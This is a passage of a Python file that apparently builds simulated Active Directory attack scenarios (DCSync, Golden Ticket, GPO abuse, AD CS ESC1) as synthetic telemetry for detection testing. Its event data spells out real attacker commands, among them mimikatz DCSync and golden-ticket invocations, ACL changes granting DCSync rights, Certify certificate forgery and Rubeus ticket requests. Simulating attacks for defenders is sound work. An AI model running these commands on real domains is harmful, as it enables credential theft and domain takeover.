        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 10), data={"process_name": "net.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 6204, "integrity_level": "high", "command_line": "net group \"Enterprise Admins\" /domain", "hash": "a6dbfc5df1ca639360a9bce1f041794d89256a103c72d1ce1018fdc22d8abc3e", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "AdFind.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Users\\Public\\AdFind.exe", "pid": 6380, "integrity_level": "high", "command_line": "AdFind.exe -b \"DC=corp,DC=internal\" -f \"(objectclass=domainDNS)\" ms-DS-MachineAccountQuota", "hash": "088a21db698f7d099d040817f2dc2e2513508fb80f6524fa41260a6137d78d53", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "AdFind.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Users\\Public\\AdFind.exe", "pid": 6452, "integrity_level": "high", "command_line": "AdFind.exe -b \"DC=corp,DC=internal\" -f \"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))\" cn", "hash": "088a21db698f7d099d040817f2dc2e2513508fb80f6524fa41260a6137d78d53", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        # Phase 3: Privilege escalation — obtain replication rights
        AttackEvent(event_type="process_event", delay=_delay(15, 8, 3, 45), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 7104, "integrity_level": "high", "command_line": "PowerShell.exe -c \"Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=internal' -PrincipalIdentity {victim_username} -Rights DCSync\"", "hash": "b6879d85613d2aa5f865ed4d5055d66f3fa51e8c14a54a5b3770f2c34d60d6b1", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "privilege_escalation"}}, requires_success=True),
        # Phase 4: DCSync — extract password hashes via DRSUAPI replication
        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 30), data={"process_name": "mimikatz.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Users\\Public\\mimikatz.exe", "pid": 7520, "integrity_level": "high", "command_line": "mimikatz.exe \"lsadump::dcsync /domain:corp.internal /user:Administrator\" exit", "hash": "781320ebb2e6d0760581c3763d71397c7f6fba462f6a66687b4e24e81fe1ffd7", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "dcsync": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 49152, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "kerberos", "bytes_sent": 512, "bytes_received": 65536, "description": "DRSUAPI GetNCChanges replication request for Administrator from non-DC host", "metadata": {"attack_phase": "credential_access", "dcsync_indicator": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "mimikatz.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Users\\Public\\mimikatz.exe", "pid": 7588, "integrity_level": "high", "command_line": "mimikatz.exe \"lsadump::dcsync /domain:corp.internal /user:krbtgt\" exit", "hash": "781320ebb2e6d0760581c3763d71397c7f6fba462f6a66687b4e24e81fe1ffd7", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "krbtgt_extraction": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 49152, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "kerberos", "bytes_sent": 512, "bytes_received": 32768, "description": "DRSUAPI GetNCChanges replication request for krbtgt from non-DC host", "metadata": {"attack_phase": "credential_access", "dcsync_indicator": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "mimikatz.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Users\\Public\\mimikatz.exe", "pid": 7640, "integrity_level": "high", "command_line": "mimikatz.exe \"lsadump::dcsync /domain:corp.internal /all /csv\" exit", "hash": "781320ebb2e6d0760581c3763d71397c7f6fba462f6a66687b4e24e81fe1ffd7", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "dcsync": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.05, 2), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 49152, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "kerberos", "bytes_sent": 1024, "bytes_received": 524288, "description": "DRSUAPI full domain replication from non-DC host — all hashes extracted", "metadata": {"attack_phase": "credential_access", "dcsync_indicator": True}}, requires_success=True),
        # Phase 5: Validate access — use extracted credentials
        AttackEvent(event_type="login", delay=_delay(20, 10, 5, 60), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "NTLM", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Active Directory", "action": "access", "usage": "admin", "resource_type": "admin_share", "resource_name": "DC01 ADMIN$", "success": True, "description": "Accessed domain controller admin share with extracted Administrator hash", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True}}, requires_success=True),
    ],
    parameters=_AD_BASE_PARAMS,
    success_rate=0.55,
    iocs=["mimikatz.exe", "AdFind.exe"],
    expected_findings=["DCSync rights granted via ACL modification", "DRSUAPI replication requests from non-DC workstation", "Administrator and krbtgt hashes targeted", "Pass-the-hash login with extracted credentials"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

GOLDEN_TICKET = AttackScenario(
    id="golden_ticket",
    tier="T2",
    name="Golden Ticket — Forged Kerberos TGT",
    description="Using stolen KRBTGT hash from prior DCSync, attacker forges TGT to impersonate any domain identity. Accesses multiple high-value services (file server, SQL, Exchange) with forged ticket, collects sensitive data, and generates anomalous network indicators.",
    attack_type="credential_access",
    events=[
        # Phase 1: KRBTGT compromise context — mimikatz extracts krbtgt hash
        AttackEvent(event_type="process_event", delay=_delay(0, 0), data={"process_name": "mimikatz.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Users\\Public\\mimikatz.exe", "pid": 8100, "integrity_level": "high", "command_line": "mimikatz.exe \"lsadump::dcsync /domain:corp.internal /user:krbtgt\" exit", "hash": "e3ea709c626a07263025aad1b7418d73968501309b3a5cbed1bcbbf6db871d10", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "krbtgt_extraction": True}}, requires_success=False),
        AttackEvent(event_type="network_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 49152, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "kerberos", "bytes_sent": 512, "bytes_received": 32768, "description": "DRSUAPI replication request for krbtgt hash from non-DC host", "metadata": {"attack_phase": "credential_access", "dcsync_indicator": True}}, requires_success=True),
        # Phase 2: Golden ticket creation
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "mimikatz.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Users\\Public\\mimikatz.exe", "pid": 8160, "integrity_level": "high", "command_line": "mimikatz.exe \"kerberos::golden /user:Administrator /domain:corp.internal /sid:S-1-5-21-XXX /krbtgt:HASH /ticket:golden.kirbi\" exit", "hash": "e3ea709c626a07263025aad1b7418d73968501309b3a5cbed1bcbbf6db871d10", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "golden_ticket": True}}, requires_success=True),
        # Phase 3: Forged ticket authentication
        AttackEvent(event_type="login", delay=_delay(2, 1, 0.5, 5), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Kerberos", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True, "golden_ticket_auth": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 88, "protocol": "Kerberos", "action": "allowed", "direction": "internal", "auth": "kerberos", "bytes_sent": 2048, "bytes_received": 4096, "description": "Forged TGT presented to DC (anomalous lifetime of 10 years)", "metadata": {"attack_phase": "lateral_movement", "anomalous_ticket_lifetime": True}}, requires_success=True),
        # Phase 4: Service access with forged ticket — DC admin share
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 1, 10), data={"app": "Active Directory", "action": "access", "resource_name": "DC01 ADMIN$", "success": True, "description": "DC admin share accessed with golden ticket", "metadata": {"attack_phase": "lateral_movement", "golden_ticket_access": True}}, requires_success=True),
        # Phase 5: Service access — file server
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "File Server", "action": "access", "resource_name": "\\\\SRV-FILE-01\\Finance$", "success": True, "description": "Accessed restricted Finance share on file server with golden ticket", "metadata": {"attack_phase": "collection", "golden_ticket_access": True}}, requires_success=True),
        # Phase 6: Service access — SQL Server
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "SQL Server", "action": "access", "resource_name": "SQL Server Admin Console on SRV-SQL-01", "success": True, "description": "Authenticated to SQL Server with golden ticket impersonating Administrator", "metadata": {"attack_phase": "collection", "golden_ticket_access": True}}, requires_success=True),
        # Phase 7: Service access — Exchange
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Exchange Server", "action": "access", "resource_name": "Exchange Management Shell on SRV-EXCH-01", "success": True, "description": "Accessed Exchange admin interface with golden ticket", "metadata": {"attack_phase": "collection", "golden_ticket_access": True}}, requires_success=True),
        # Phase 8: Data collection from file server
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "read", "path": "\\\\SRV-FILE-01\\Finance$\\Q4_Results\\", "system": "fileshare", "description": "Collected quarterly financial reports via golden ticket access", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        # Phase 9: Network indicator — anomalous Kerberos traffic pattern
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 8), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 88, "protocol": "Kerberos", "action": "allowed", "direction": "internal", "auth": "kerberos", "bytes_sent": 4096, "bytes_received": 8192, "description": "Burst of Kerberos TGS requests for multiple SPNs from single workstation within 60 seconds", "metadata": {"attack_phase": "lateral_movement", "anomalous_kerberos_burst": True}}, requires_success=True),
    ],
    parameters=_AD_BASE_PARAMS,
    success_rate=0.5,
    iocs=["mimikatz.exe"],
    expected_findings=["DCSync replication for krbtgt hash", "mimikatz golden ticket creation", "Anomalous ticket lifetime", "Admin auth from atypical host"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

GPO_ABUSE = AttackScenario(
    id="gpo_abuse",
    tier="T3",
    name="Group Policy Object Abuse for Mass Payload Deployment",
    description="Attacker performs AD enumeration, modifies GPO to deploy malicious scheduled task across all hosts in target OU. After GPO policy refresh, multiple victim machines execute the deployed payload, establishing C2 from each. Attacker runs discovery and recon commands on compromised hosts.",
    attack_type="persistence",
    events=[
        # Phase 1: Initial access
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # Phase 2: AD enumeration before GPO modification
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "net.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 8500, "integrity_level": "high", "command_line": "net group \"Domain Admins\" /domain", "hash": "bd2ff288e3000b04597b22ff917dbbdc8ec292bc9dcf03cceb49bb7ab04e3e1f", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "whoami.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\whoami.exe", "pid": 8540, "integrity_level": "high", "command_line": "whoami /priv", "hash": "3d7093f2cef925df353f4a5828b9172ed6029b1b390fadbbcd80f683f5dc2a51", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "net.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 8580, "integrity_level": "high", "command_line": "net group \"Group Policy Creator Owners\" /domain", "hash": "bd2ff288e3000b04597b22ff917dbbdc8ec292bc9dcf03cceb49bb7ab04e3e1f", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        # Phase 3: GPO modification — inject malicious scheduled task
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "Group Policy Management Console", "action": "gpo_modify", "resource_name": "Default Domain Policy", "success": True, "description": "GPO modified to deploy malicious payload via Scheduled Tasks preference", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.5, 5), data={"app": "Group Policy Management Console", "action": "gpo_scheduled_task_add", "resource_name": "Default Domain Policy \u2014 Scheduled Task", "success": True, "description": "Malicious scheduled task added to GPO targeting all Workstations OU", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),
        # Phase 4: GPO policy refresh wait — large delay simulates gpupdate propagation
        AttackEvent(event_type="process_event", delay=_delay(120, 60, 30, 300), data={"process_name": "svcupdate.exe", "action": "start", "parent_process": "svchost.exe", "path": "C:\\Windows\\Temp\\svcupdate.exe", "pid": 1204, "integrity_level": "system", "command_line": "C:\\Windows\\Temp\\svcupdate.exe", "hash": "e6dccbe835991a61766a1a25c01f6b29e7d3ec56ed25ec836a6e67d6b34330ad", "user_context": "NT AUTHORITY\\SYSTEM", "metadata": {"attack_phase": "execution", "gpo_deployed_payload": True, "victim_host": "WKSTN-101"}}, requires_success=True),
        # Phase 5: Multiple victim machines executing deployed payload
        AttackEvent(event_type="process_event", delay=_delay(15, 8, 3, 45), data={"process_name": "svcupdate.exe", "action": "start", "parent_process": "svchost.exe", "path": "C:\\Windows\\Temp\\svcupdate.exe", "pid": 1308, "integrity_level": "system", "command_line": "C:\\Windows\\Temp\\svcupdate.exe", "hash": "e6dccbe835991a61766a1a25c01f6b29e7d3ec56ed25ec836a6e67d6b34330ad", "user_context": "NT AUTHORITY\\SYSTEM", "metadata": {"attack_phase": "execution", "gpo_deployed_payload": True, "victim_host": "WKSTN-102"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 30), data={"process_name": "svcupdate.exe", "action": "start", "parent_process": "svchost.exe", "path": "C:\\Windows\\Temp\\svcupdate.exe", "pid": 1412, "integrity_level": "system", "command_line": "C:\\Windows\\Temp\\svcupdate.exe", "hash": "e6dccbe835991a61766a1a25c01f6b29e7d3ec56ed25ec836a6e67d6b34330ad", "user_context": "NT AUTHORITY\\SYSTEM", "metadata": {"attack_phase": "execution", "gpo_deployed_payload": True, "victim_host": "SRV-APP-01"}}, requires_success=True),
        # Phase 6: C2 from multiple hosts
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 512, "bytes_received": 2048, "description": "C2 beacon from GPO-deployed payload on WKSTN-101", "metadata": {"attack_phase": "command_and_control", "c2_beacon": True, "victim_host": "WKSTN-101"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 10), data={"source_ip": "10.0.5.102", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 512, "bytes_received": 2048, "description": "C2 beacon from GPO-deployed payload on WKSTN-102", "metadata": {"attack_phase": "command_and_control", "c2_beacon": True, "victim_host": "WKSTN-102"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 10), data={"source_ip": "10.0.2.10", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 512, "bytes_received": 2048, "description": "C2 beacon from GPO-deployed payload on SRV-APP-01", "metadata": {"attack_phase": "command_and_control", "c2_beacon": True, "victim_host": "SRV-APP-01"}}, requires_success=True),
        # Phase 7: Discovery/recon on compromised hosts
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "cmd.exe", "action": "start", "parent_process": "svcupdate.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 1520, "integrity_level": "system", "command_line": "cmd.exe /c whoami /all & hostname & net localgroup administrators", "hash": "8f44ccd3c8ef884a299a43051db3bb6c81d2af40eae8116f46a6a5e4fef39978", "user_context": "NT AUTHORITY\\SYSTEM", "metadata": {"attack_phase": "discovery", "gpo_deployed": True}}, requires_success=True),
    ],
    parameters=_AD_BASE_PARAMS,
    success_rate=0.5,
    iocs=["cdn-static-assets.com"],
    expected_findings=["High-impact GPO modified", "Scheduled task embedded in GPO", "GPO policy refresh triggers payload on multiple hosts", "Mass C2 connections from multiple hosts"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo", "c2_domain"],
)

AD_CS_CERTIFICATE_ABUSE = AttackScenario(
    id="ad_cs_certificate_abuse",
    tier="T3",
    name="AD CS Certificate Abuse (ESC1 / Subject Alternative Name Forgery)",
    description="Attacker compromises a standard domain user, enumerates AD CS infrastructure to find a misconfigured certificate template allowing SAN specification (ESC1). Requests a certificate impersonating a Domain Admin via PKINIT, obtains a TGT, performs DCSync to extract domain hashes, and uses the long-lived certificate for persistent access across multiple systems.",
    attack_type="credential_access",
    events=[
        # =====================================================================
        # DAY 1 — Initial access + AD CS reconnaissance
        # =====================================================================

        # --- Phase 1: Initial access — attacker logs in with compromised creds ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: Reconnaissance — enumerate AD CS infrastructure ---
        # Attacker runs Certify to find CAs and vulnerable templates
        AttackEvent(event_type="process_event", delay=_delay(8, 4, 2, 20), data={"process_name": "Certify.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "Certify.exe cas /domain:corp.internal", "path": "C:\\Users\\Public\\Certify.exe", "pid": 7312, "integrity_level": "medium", "hash": "a3f2b8c1d4e5f67890abcdef12345678abcdef1234567890abcdef1234567890", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "tool": "Certify"}}, requires_success=True),
        # Network call to LDAP querying CA configuration
        AttackEvent(event_type="network_event", delay=_delay(0.2, 0.1, 0.05, 0.5), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 389, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "{victim_username}", "auth": "kerberos", "bytes_sent": 2048, "bytes_received": 18432, "description": "LDAP query to domain controller for PKI enrollment services configuration"}, requires_success=True),
        # Certify find vulnerable templates
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "Certify.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "Certify.exe find /vulnerable /ca:CORP-CA01-CA /domain:corp.internal", "path": "C:\\Users\\Public\\Certify.exe", "pid": 7448, "integrity_level": "medium", "hash": "a3f2b8c1d4e5f67890abcdef12345678abcdef1234567890abcdef1234567890", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "tool": "Certify"}}, requires_success=True),
        # LDAP queries enumerating certificate templates from AD
        AttackEvent(event_type="network_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 389, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "{victim_username}", "auth": "kerberos", "bytes_sent": 4096, "bytes_received": 32768, "description": "LDAP query enumerating certificate templates in CN=Certificate Templates,CN=Public Key Services"}, requires_success=True),
        # Attacker inspects the CorpVPN template ACLs to confirm ESC1 conditions
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 10), data={"process_name": "Certify.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "Certify.exe find /ca:CORP-CA01-CA /template:CorpVPN /showAllPermissions", "path": "C:\\Users\\Public\\Certify.exe", "pid": 7516, "integrity_level": "medium", "hash": "a3f2b8c1d4e5f67890abcdef12345678abcdef1234567890abcdef1234567890", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "tool": "Certify", "template_acl_check": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.2, 0.1, 0.05, 0.5), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 389, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "{victim_username}", "auth": "kerberos", "bytes_sent": 2560, "bytes_received": 12288, "description": "LDAP query for ACL and enrollment permissions on CorpVPN certificate template"}, requires_success=True),

        # =====================================================================
        # DAY 2 — Attacker returns, requests forged cert, PKINIT + DCSync
        # (overnight gap: attacker analyzes recon results offline)
        # =====================================================================

        # --- Phase 3: Attacker returns next day ---
        AttackEvent(event_type="login", delay=_delay(1080, 360, 720, 1800), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "credential_access", "is_attacker": True, "return_session": True}}, requires_success=False),

        # --- Phase 4: Certificate request — abuse ESC1 misconfigured template ---
        # Attacker requests certificate with SAN set to Domain Admin
        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 25), data={"process_name": "Certify.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "Certify.exe request /ca:CORP-CA01-CA\\CORP-CA01-CA /template:CorpVPN /altname:administrator@corp.internal", "path": "C:\\Users\\Public\\Certify.exe", "pid": 8104, "integrity_level": "medium", "hash": "a3f2b8c1d4e5f67890abcdef12345678abcdef1234567890abcdef1234567890", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "tool": "Certify", "adcs_esc1": True, "requested_san": "administrator@corp.internal"}}, requires_success=True),
        # Network call to CA web enrollment endpoint
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.15", "destination_port": 135, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "{victim_username}", "auth": "kerberos", "bytes_sent": 3072, "bytes_received": 6144, "description": "RPC to Certificate Authority CORP-CA01 for certificate enrollment"}, requires_success=True),
        # CA issues the certificate (Event 4887 equivalent)
        AttackEvent(event_type="app_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"app": "Active Directory Certificate Services", "action": "certificate_issued", "resource_type": "certificate", "resource_id": "req_20261019_0847", "resource_name": "CorpVPN", "success": True, "description": "Certificate issued by CORP-CA01-CA for template CorpVPN — requester CORP\\{victim_username} with SAN administrator@corp.internal", "metadata": {"attack_phase": "credential_access", "adcs_esc1": True, "template": "CorpVPN", "requester": "{victim_username}", "san_mismatch": True}}, requires_success=True),
        # Attacker converts PEM to PFX locally
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "openssl.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "openssl.exe pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out admin.pfx", "path": "C:\\Users\\Public\\openssl.exe", "pid": 8256, "integrity_level": "medium", "hash": "b4c3d2e1f0a9876543210fedcba987654321fedcba9876543210fedcba987654", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "cert_conversion": True}}, requires_success=True),

        # --- Phase 5: PKINIT authentication — use forged cert to get TGT ---
        # Rubeus uses the certificate to request a TGT as Domain Admin
        AttackEvent(event_type="process_event", delay=_delay(3, 1.5, 0.5, 8), data={"process_name": "Rubeus.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:pass /ptt /nowrap", "path": "C:\\Users\\Public\\Rubeus.exe", "pid": 8512, "integrity_level": "medium", "hash": "c5d4e3f2a1b098765432fedcba876543210fedcba987654321fedcba98765432", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "tool": "Rubeus", "pkinit_auth": True}}, requires_success=True),
        # Kerberos AS-REQ with certificate pre-authentication (PKINIT)
        AttackEvent(event_type="network_event", delay=_delay(0.1, 0.05, 0.02, 0.3), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 88, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "administrator", "auth": "certificate", "bytes_sent": 4096, "bytes_received": 2048, "description": "Kerberos AS-REQ with PKINIT certificate pre-authentication for administrator"}, requires_success=True),
        # Login event — certificate-based authentication as Domain Admin
        AttackEvent(event_type="login", delay=_delay(0.2, 0.1, 0.05, 0.5), data={"success": True, "ip": "{victim_ip}", "geo": "Internal Network", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Certificate", "app": "Kerberos", "metadata": {"attack_phase": "credential_access", "is_attacker": True, "pkinit_auth": True, "pre_auth_type": 16, "impersonated_user": "administrator"}}, requires_success=True),

        # --- Phase 6: Post-exploitation — DCSync with Domain Admin TGT ---
        # Attacker uses mimikatz to perform DCSync
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "mimikatz.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "mimikatz.exe \"lsadump::dcsync /domain:corp.internal /user:krbtgt\" exit", "path": "C:\\Users\\Public\\mimikatz.exe", "pid": 9024, "integrity_level": "high", "hash": "61be624b2103d3f75fd4de35f6bcee2f97ab7b99840fbf64305a33a479d2a3b1", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "credential_access", "tool": "mimikatz", "dcsync": True}}, requires_success=True),
        # DRS replication traffic to DC (DCSync)
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 135, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "administrator", "auth": "kerberos", "bytes_sent": 1024, "bytes_received": 524288, "description": "DRSUAPI RPC replication request to domain controller — GetNCChanges for krbtgt account"}, requires_success=True),
        # Second DCSync for full domain dump
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "mimikatz.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "mimikatz.exe \"lsadump::dcsync /domain:corp.internal /all /csv\" exit", "path": "C:\\Users\\Public\\mimikatz.exe", "pid": 9156, "integrity_level": "high", "hash": "61be624b2103d3f75fd4de35f6bcee2f97ab7b99840fbf64305a33a479d2a3b1", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "credential_access", "tool": "mimikatz", "dcsync": True, "full_domain_dump": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.3, 0.1, 2), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 135, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "administrator", "auth": "kerberos", "bytes_sent": 2048, "bytes_received": 2097152, "description": "DRSUAPI RPC replication request — full domain credential dump via GetNCChanges"}, requires_success=True),
        # Attacker saves extracted hashes to a local file for later exfil
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "cmd.exe", "action": "start", "parent_process": "mimikatz.exe", "command_line": "cmd.exe /c copy C:\\Users\\Public\\mimikatz_output.txt C:\\Users\\Public\\syslog.bak", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 9204, "integrity_level": "high", "hash": "d744cd99138558dcab0f895e3596a05efd8e33ceba2b031c2207583da9d2109a", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "collection", "is_attacker": True, "hash_dump_staging": True}}, requires_success=True),
        # Exfil the hash dump back to attacker infrastructure
        AttackEvent(event_type="network_event", delay=_delay(2, 1, 0.5, 5), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "administrator", "auth": "none", "bytes_sent": 1048576, "bytes_received": 512, "description": "HTTPS upload to external IP — 1 MB outbound transfer of credential dump"}, requires_success=True),

        # =====================================================================
        # DAY 3 — Attacker returns with long-lived certificate for lateral
        #          movement, data collection, and exfiltration
        # =====================================================================

        # --- Phase 7: Attacker returns using certificate — persistent access ---
